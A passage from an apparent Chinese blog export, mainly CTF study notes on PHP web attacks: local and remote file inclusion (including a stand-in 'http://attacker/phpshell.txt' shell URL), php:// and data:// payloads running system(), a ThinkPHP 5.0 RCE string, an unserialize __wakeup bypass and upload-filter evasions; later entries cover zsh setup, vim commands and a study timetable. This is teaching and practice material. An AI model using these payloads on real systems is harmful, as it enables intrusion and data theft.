<code>magic_quotes_gpc=off</code>，PHP 小于 5.3.4 有效。</p></li><li><p>路径长度截断<br><code>?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.</code><br>Linux 需要文件名长于 4096，Windows 需要长于 256。</p></li><li><p>点号截断<br><code>?file=../../../../../../../../../boot.ini/………[…]…………</code><br>只适用 Windows，点号需要长于 256。</p></li></ol><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>远程文件包含，Remote File Inclusion，RFI。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$route</span> <span class="token operator">==</span> <span class="token string">"share"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">require_once</span> <span class="token variable">$basePath</span> <span class="token punctuation">.</span> <span class="token string">"/action/m_share.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$route</span> <span class="token operator">==</span> <span class="token string">"sharelink"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">require_once</span> <span class="token variable">$basePath</span> <span class="token punctuation">.</span> <span class="token string">"/action/m_sharelink.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造变量 basePath 的值,<code>/?basePath=http://attacker/phpshell.txt?</code><br>最终的代码执行了<code>require_once &quot;http://attacker/phpshell.txt?/action/m_share.php&quot;;</code><br>问号后的部分被解释为 URL 的 querystring，这也是一种「截断」。</p><ul><li><p>普通远程文件包含<br>`?file=[http|https|ftp]://example.com/shell.txt<br>需要 allow_url_fopen=On 并且 allow_url_include=On 。</p></li><li><p>利用 PHP 流 input<br><code>?file=php://input</code><br>需要 allow_url_include=On 。</p></li><li><p>利用 PHP 流 filter<br><code>?file=php://filter/convert.base64-encode/resource=index.php</code><br>需要 allow_url_include=On 。</p></li><li><p>利用 data URIs<br><code>?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=</code><br>需要 allow_url_include=On 。</p></li><li><p>利用 XSS 执行<br><code>?file=http://127.0.0.1/path/xss.php?xss=phpcode</code><br>需要 allow_url_fopen=On，allow_url_include=On 并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。</p></li></ul><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><ol><li><code>?page=data:text/plain,&lt;?php system(ls);?&gt;</code></li><li><pre><code>GET /?page=PHP://input HTTP/1.1Host: 111.198.29.45:44656Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Content-Length: 48</code></pre></li></ol><?php system("cat ./fl4gisisish3r3.php"); ?><pre><code>3. `http://111.198.29.45:44656/?page=PHP://filter/read=convert.base64-encode/resource=fl4gisisish3r3.php`# 题目3 thinkphp5.0 rce## payload`?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag`# 题目4 php反序列化## 源码```php&lt;?php class Demo {     private $file = &#39;index.php&#39;;    public function __construct($file) {         $this-&gt;file = $file;     }    function __destruct() {         echo @highlight_file($this-&gt;file, true);     }    function __wakeup() {         if ($this-&gt;file != &#39;index.php&#39;) {             //the secret is in the fl4g.php            $this-&gt;file = &#39;index.php&#39;;         }     } }if (isset($_GET[&#39;var&#39;])) {     $var = base64_decode($_GET[&#39;var&#39;]);     if (preg_match(&#39;/[oc]:\d+:/i&#39;, $var)) {         die(&#39;stop hacking!&#39;);     } else {        @unserialize($var);     } } else {     highlight_file(&quot;index.php&quot;); } ?&gt;</code></pre><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><ol><li>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行。</li><li>这段正则 <code>preg_match(&#39;/[oc]:\d+:/i&#39;, $var)</code>匹配了<code>O:4</code></li></ol><h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h2><pre class="line-numbers language-php"><code class="language-php">    <span class="token variable">$A</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Demo</span><span class="token punctuation">(</span><span class="token string">'fl4g.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$A</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//string(49) "O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}"</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'O:4'</span><span class="token punctuation">,</span> <span class="token string">'O:+4'</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//绕过preg_match</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">':1:'</span><span class="token punctuation">,</span> <span class="token string">':2:'</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//绕过wakeup</span>　　 <span class="token comment" spellcheck="true">//string(49) "O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}"</span>    <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>　　<span class="token comment" spellcheck="true">//TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><p><a href="https://www.cnblogs.com/ichunqiu/p/10484832.html" target="_blank" rel="noopener">https://www.cnblogs.com/ichunqiu/p/10484832.html</a></p><h1 id="题目5"><a href="#题目5" class="headerlink" title="题目5"></a>题目5</h1><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">emmm</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//page有值且为字符串</span>                <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//page在whitelist里</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//file非空</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//file是字符串</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//checkFile(file)为true</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> "<span class="token markup">&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /></span>"<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h2><ol><li><p>假如waf不允许num变量传递字母<br>可以在num前加个空格.这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p></li><li><p>php常用操作<br><code>scandir()</code> 列出参数目录中的文件和目录<br><code>var_dump(file_get_contents())</code>读取文件</p></li></ol><h1 id="题目6-文件上传"><a href="#题目6-文件上传" class="headerlink" title="题目6 文件上传"></a>题目6 文件上传</h1><p>文件上传漏洞是指用户上传了一个可执行脚本文件，并通过此文件获得了执行服器端命令的能力。在大多数情况下，文件上传漏洞一般是指上传 WEB 脚本能够被服务器解析的问题，也就是所谓的 webshell 问题。完成这一攻击需要这样几个条件，一是上传的文件能够这 WEB 容器执行，其次用户能从 WEB 上访问这个文件，最后，如果上传的文件被安全检查、格式化、图片压缩等功能改变了内容，则可能导致攻击失败。</p><h2 id="绕过上传检查"><a href="#绕过上传检查" class="headerlink" title="绕过上传检查"></a>绕过上传检查</h2><ol><li><p>前端检查扩展名<br>抓包绕过即可。</p></li><li><p>Content-Type 检测文件类型<br>抓包修改 Content-Type 类型，使其符合白名单规则。</p></li><li><p>服务端添加后缀<br>尝试 %00 截断。</p></li><li><p>服务端扩展名检测<br>利用解析漏洞。</p></li><li><p>Apache 解析<br>phpshell.php.rar.rar.rar.rar 因为 Apache 不认识 .rar 这个文件类型，所以会一直遍历后缀到 .php，然后认为这是一个 PHP 文件。</p></li><li><p>IIS 解析<br>IIS 6 下当文件名为 abc.asp;xx.jpg 时，会将其解析为 abc.asp。</p></li><li><p>PHP CGI 路径解析<br>当访问<code>http://www.a.com/path/test.jpg/notexist.php</code>时，会将 test.jpg 当做 PHP 解析， notexist.php 是不存在的文件。此时 Nginx 的配置如下</p><pre><code>location ~ \.php$ {root html;fastcgi_pass 127.0.0.1:9000;fastcgi_index index.php;fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name;include fastcgi_param;}</code></pre></li><li><p>其他方式<br>后缀大小写、双写、特殊后缀如 php5 等，修改包内容的大小写过 WAF 等。</p></li></ol><h1 id="题目7-变量覆盖"><a href="#题目7-变量覆盖" class="headerlink" title="题目7 变量覆盖"></a>题目7 变量覆盖</h1><h2 id="全局变量覆盖"><a href="#全局变量覆盖" class="headerlink" title="全局变量覆盖"></a>全局变量覆盖</h2><p>变量如果未被初始化，且能够用户所控制，那么很可能会导致安全问题。<br><code>register_globals=ON</code></p><p>示例</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token string">"Register_globals: "</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">"register_globals"</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$auth</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"private!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当<code>register_globals=ON</code>时，提交 <code>test.php?auth=1</code>，<code>auth</code> 变量将自动得到赋值。</p><h2 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract() 变量覆盖"></a>extract() 变量覆盖</h2><p>extract() 函数能够将变量从数组导入到当前的符号表，其定义为<br><code>int extract ( array $var_array [, int $extract_type [, string $prefix ]] )</code><br>其中，第二个参数指定函数将变量导入符号表时的行为，最常见的两个值是 EXTR_OVERWRITE 和 EXTR_SKIP。</p><p>当值为 EXTR_OVERWRITE 时，在将变量导入符号表的过程中，如果变量名发生冲突，则覆盖所有变量；值为 EXTR_SKIP 则表示跳过不覆盖。若第二个参数未指定，则在默认情况下使用 EXTR_OVERWRITE。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$auth</span> <span class="token operator">=</span> <span class="token string">"0"</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$auth</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"private!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"public!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当 extract() 函数从用户可以控制的数组中导出变量时，可能发生变量覆盖。</p><h2 id="import-request-variables-变量覆盖"><a href="#import-request-variables-变量覆盖" class="headerlink" title="import_request_variables 变量覆盖"></a>import_request_variables 变量覆盖</h2><p><code>bool import_request_variables (string $types [, string $prefix])</code><br>import_request_variables 将 GET、POST、Cookies 中的变量导入到全局，使用这个函数只用简单地指定类型即可。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$auth</span> <span class="token operator">=</span> <span class="token string">"0"</span><span class="token punctuation">;</span><span class="token function">import_request_variables</span><span class="token punctuation">(</span><span class="token string">"G"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$auth</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"private!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"public!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>import_request_variables(“G”) 指定导入 GET 请求中的变量，提交 test.php?auth=1 出现变量覆盖。</p><h2 id="parse-str-变量覆盖"><a href="#parse-str-变量覆盖" class="headerlink" title="parse_str() 变量覆盖"></a>parse_str() 变量覆盖</h2><p><code>void parse_str ( string $str [, array &amp;$arr ])</code><br><code>parse_str()</code> 函数通常用于解析<code>URL</code>中的<code>querystring</code>，但是当参数值可以被用户控制时，很可能导致变量覆盖。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// var.php?var=new  变量覆盖</span><span class="token variable">$var</span> <span class="token operator">=</span> <span class="token string">"init"</span><span class="token punctuation">;</span><span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"QUERY_STRING"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span> <span class="token variable">$var</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>与 parse_str() 类似的函数还有 mb_parse_str()。</p><h1 id="题目8"><a href="#题目8" class="headerlink" title="题目8"></a>题目8</h1>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> web </tag>
            
            <tag> urlencode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>组会内容</title>
      <link href="/2020/CTF/%E7%BB%84%E4%BC%9A%E5%86%85%E5%AE%B9/"/>
      <url>/2020/CTF/%E7%BB%84%E4%BC%9A%E5%86%85%E5%AE%B9/</url>
      
        <content type="html"><![CDATA[<p>开组会啦，我又是什么都没学习的一周</p><a id="more"></a><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><ol><li>DVWA web题</li><li>sever酱</li></ol><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><ol><li>pwntools</li></ol><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><ol><li>区块链 =&gt; Ethernaut</li></ol><h2 id="CR"><a href="#CR" class="headerlink" title="CR"></a>CR</h2><ol><li>openssl 加密解密rsa</li></ol><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><ol><li>MOV fuscator  只用mov写的汇编程序</li><li>dex2jar  Android反编译</li><li>ida wasm  buddy</li></ol><h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><p>ZFSNAS网络存储linux0.11<br>ember<br>feature.py</p><p>LIEF<br>phar<br>pop 链</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>connectaliyun</title>
      <link href="/2020/diary/connectaliyun/"/>
      <url>/2020/diary/connectaliyun/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="e1c0127274a8e15fff02ce43157c859648b4120240a17e1595c8ccecb94f6064">e32c27e47419b87d293b9e8ce412adf8b4e123cc6d82c6dc03a9639d79335fe51564c59cf5d3d7604c54e9a1adbcb3b492331bb00cdf2e87fe397f4e7966443fb2136c0bc047b4c4c4d689720c85bab66bfeb81f11841461b67c25b874daf455228a875637fe6caa540897377eb77a69c42140414b1b96d649e7209218f15d0730e5fba8032e3585c5a4fa0ed642a733</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>studytimetable</title>
      <link href="/2020/learning/studytimetable/"/>
      <url>/2020/learning/studytimetable/</url>
      
        <content type="html"><![CDATA[<h2 id="学习时间表"><a href="#学习时间表" class="headerlink" title="学习时间表"></a>学习时间表</h2><a id="more"></a>  <table style="undefined;table-layout: fixed; width: 222px;">  <colgroup>  <col style="width: 131px">  <col style="width: 141px">  </colgroup>    <tr align="center">      <th colspan="2">学习计划表</th>    </tr>    <tr>      <td>时间</td>      <td>事件</td>    </tr>    <tr>      <td>6:00-6:30</td>      <td>背单词</td>    </tr>    <tr>      <td>6:30-8:10</td>      <td>英语精读</td>    </tr>    <tr>      <td>8:15-9:45</td>      <td>第一、二节课</td>    </tr>    <tr>      <td>10:05-11:35</td>      <td>第三、四节课</td>    </tr>    <tr>      <td>12:00-13:00</td>      <td>看美剧</td>    </tr>    <tr>      <td>13:00-14:30</td>      <td>第五、六节课</td>    </tr>    <tr>      <td>14:50-16:20</td>      <td>第七、八节课</td>    </tr>    <tr>      <td>16:30-17:00</td>      <td>看美剧</td>    </tr>    <tr>      <td>17:30-18:30</td>      <td>编程</td>    </tr>    <tr>      <td>18:30-20:00</td>      <td>做作业</td>    </tr>    <tr>      <td>20:00-21:00</td>      <td>复习</td>    </tr>    <tr>      <td>21:00-22:00</td>      <td>阅读</td>    </tr>  </table>  ]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>install_zsh</title>
      <link href="/2020/CS/install-zsh/"/>
      <url>/2020/CS/install-zsh/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="安装zsh"><a href="#安装zsh" class="headerlink" title="安装zsh"></a>安装zsh</h1><ol><li><p><code>sudo apt-get install zsh</code></p></li><li><p><code>sh -c &quot;$(wget -O- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;</code><br><a href="https://github.com/ohmyzsh/ohmyzsh" target="_blank" rel="noopener">ohmyzsh</a>是一个很棒的美化zsh的开源项目<br>出现错误，手动安装</p><ol><li><code>git clone git://github.com/robbyrussell/oh-my-zsh.git ~/.oh-my-zsh</code></li><li><code>cp ~/.zshrc ~/.zshrc.orig</code></li><li><code>cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc</code><br><img src="/images/zsh.png" alt="zsh" loading="lazy"></li></ol></li><li><p><code>chsh -s $(which zsh)</code>将zsh设置成默认bash</p></li><li><p>修改.zshrc配置文件</p><ol><li>zsh-themes: blinks/avit/agnoster/af-magic/ys</li><li>plunges:zsh-syntax-highlighting z git </li></ol></li><li><p>autojump<br><code>sudo apt-get install autojump</code></p></li><li><p>zsh-syntax-highlighting</p><pre><code>git clone https://github.com/zsh-users/zsh-syntax-highlighting.git echo &quot;source ${(q-)PWD}/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh&quot; &gt;&gt; ${ZDOTDIR:-$HOME}/.zshrc</code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 终端 </tag>
            
            <tag> zsh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vim命令</title>
      <link href="/2020/CS/vim%E5%91%BD%E4%BB%A4/"/>
      <url>/2020/CS/vim%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>开始学习vim啦，现在还是有一点不顺手，害。</p><a id="more"></a><pre><code>Ctrl+u：向文件首翻半屏；Ctrl+d：向文件尾翻半屏；Ctrl+f：向文件尾翻一屏；Ctrl+b：向文件首翻一屏；Esc：从编辑模式切换到命令模式；ZZ：命令模式下保存当前文件所做的修改后退出vi；:行号：光标跳转到指定行的行首；:$：光标跳转到最后一行的行首；x或X：删除一个字符，x删除光标后的，而X删除光标前的；D：删除从当前光标到光标所在行尾的全部字符；dd：删除光标行正行内容；ndd：删除当前行及其后n-1行；nyy：将当前行及其下n行的内容保存到寄存器？中，其中？为一个字母，n为一个数字；p：粘贴文本操作，用于将缓存区的内容粘贴到当前光标所在位置的下方；P：粘贴文本操作，用于将缓存区的内容粘贴到当前光标所在位置的上方；/字符串：文本查找操作，用于从当前光标所在位置开始向文件尾部查找指定字符串的内容，查找的字符串会被加亮显示；？name：文本查找操作，用于从当前光标所在位置开始向文件头部查找指定字符串的内容，查找的字符串会被加亮显示；a，bs/F/T：替换文本操作，用于在第a行到第b行之间，将F字符串换成T字符串。其中，“s/”表示进行替换操作；a：在当前字符后添加文本；A：在行末添加文本；i：在当前字符前插入文本；I：在行首插入文本；o：在当前行后面插入一空行；O：在当前行前面插入一空行；:wq：在命令模式下，执行存盘退出操作；:w：在命令模式下，执行存盘操作；:w！：在命令模式下，执行强制存盘操作；:q：在命令模式下，执行退出vi操作；:q！：在命令模式下，执行强制退出vi操作；:e文件名：在命令模式下，打开并编辑指定名称的文件；:n：在命令模式下，如果同时打开多个文件，则继续编辑下一个文件；:f：在命令模式下，用于显示当前的文件名、光标所在行的行号以及显示比例；:set number：在命令模式下，用于在最左端显示行号；:set nonumber：在命令模式下，用于在最左端不显示行号；选项+&lt;行号&gt;：从指定行号的行开始先是文本内容；-b：以二进制模式打开文件，用于编辑二进制文件和可执行文件；-c&lt;指令&gt;：在完成对第一个文件编辑任务后，执行给出的指令；-d：以diff模式打开文件，当多个文件编辑时，显示文件差异部分；-l：使用lisp模式，打开“lisp”和“showmatch”；-m：取消写文件功能，重设“write”选项；-M：关闭修改功能；-n：不实用缓存功能；-o&lt;文件数目&gt;：指定同时打开指定数目的文件；-R：以只读方式打开文件；-s：安静模式，不现实指令的任何错误信息。</code></pre>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>createQT</title>
      <link href="/2020/CS/createQT/"/>
      <url>/2020/CS/createQT/</url>
      
